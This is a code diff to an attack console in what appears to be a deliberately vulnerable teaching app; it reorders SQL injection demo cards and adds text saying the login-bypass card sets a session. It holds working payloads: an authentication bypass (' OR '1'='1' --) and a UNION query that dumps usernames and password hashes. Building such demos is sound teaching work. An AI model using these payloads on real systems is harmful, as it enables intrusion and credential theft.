@@ -38,6 +38,14 @@ interface Attack {
 
 const ATTACKS: Attack[] = [
   {
+    id: "sqli-login",
+    title: "SQL injection — log in without a password",
+    description:
+      "A username of  ' OR '1'='1' --  comments out the password check and matches the first row in the users table. Run this first: it also gives you the session the other cards need.",
+    defaultPayload: "' OR '1'='1' --",
+    run: (p) => raw("POST", "/api/auth/login", { username: p, password: "anything" }),
+  },
+  {
     id: "sqli-union",
     title: "SQL injection — dump the users table",
     description:
@@ -45,14 +53,6 @@ const ATTACKS: Attack[] = [
     defaultPayload:
       "' UNION SELECT NULL, username, id::text || ' | ' || password_hash, now(), now() FROM users --",
     run: (p) => raw("GET", `/api/notes/search?q=${encodeURIComponent(p)}`),
-  },
-  {
-    id: "sqli-login",
-    title: "SQL injection — log in without a password",
-    description:
-      "A username of  ' OR '1'='1' --  comments out the password check and matches the first row in the users table.",
-    defaultPayload: "' OR '1'='1' --",
-    run: (p) => raw("POST", "/api/auth/login", { username: p, password: "anything" }),
   },
   {
     id: "session-forge",
@@ -170,6 +170,10 @@ export function AttackConsole() {
       <p style={{ color: "#4b5563" }}>
         Each button sends a real request to this app's API and shows the response. This exists to
         demonstrate the flaws documented in the writeups.
+      </p>
+      <p style={{ fontSize: 14 }}>
+        Most cards need a logged-in session. Either sign in on the Notes page, or run{" "}
+        <em>SQL injection — log in without a password</em> first (it sets a session cookie).
       </p>
       <p style={{ fontSize: 14 }}>
         CSRF is shown separately with an off-site page:{" "}
